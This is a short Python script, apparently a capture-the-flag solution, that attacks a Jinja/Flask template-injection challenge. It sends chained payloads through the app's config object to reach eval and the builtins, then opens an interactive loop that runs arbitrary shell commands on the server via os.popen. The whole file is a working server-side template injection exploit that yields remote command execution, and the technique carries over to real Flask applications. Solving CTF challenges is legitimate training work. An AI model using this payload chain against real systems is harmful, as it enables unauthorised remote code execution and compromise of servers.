import requests

def send(query, **kwargs):
  req = requests.get(
    "http://sstigolf.chal.imaginaryctf.org/ssti",
    {
      "query": '{{' + query + '}}',
      **kwargs
    }
  )
  return req.text

send("config.__setitem__('s','__setitem__')")
send("config[config.s]('a',joiner.__init__)")
send("config[config.s]('a',config.a.__globals__)")
send("config[config.s]('a',config.a.__builtins__)")
while True:
  print(send("config.a.eval(request.args.q)", q=f"__import__('os').popen('{input('> ')}').read()"))
